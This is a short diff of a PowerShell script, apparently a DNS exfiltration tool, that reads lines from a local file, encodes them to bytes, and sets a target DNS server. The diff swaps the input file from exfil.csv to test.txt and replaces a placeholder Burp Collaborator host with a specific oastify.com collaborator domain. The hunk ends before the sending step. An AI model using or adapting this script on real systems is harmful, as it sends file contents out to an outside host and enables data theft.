@@ -6,8 +6,8 @@
 # Update $dnsserver var with DNS server to use
 #
 
-$lines = Get-Content .\exfil.csv
-$dnsserver = "yourhost.burpcollaborator.net"
+$lines = Get-Content .\test.txt
+$dnsserver = "y986956am9r792zyqesztaz2bthk5et3.oastify.com"
 foreach ($line in $lines){ 
     echo "Line: $line"
     $Bytes = [System.Text.Encoding]::Unicode.GetBytes($line)
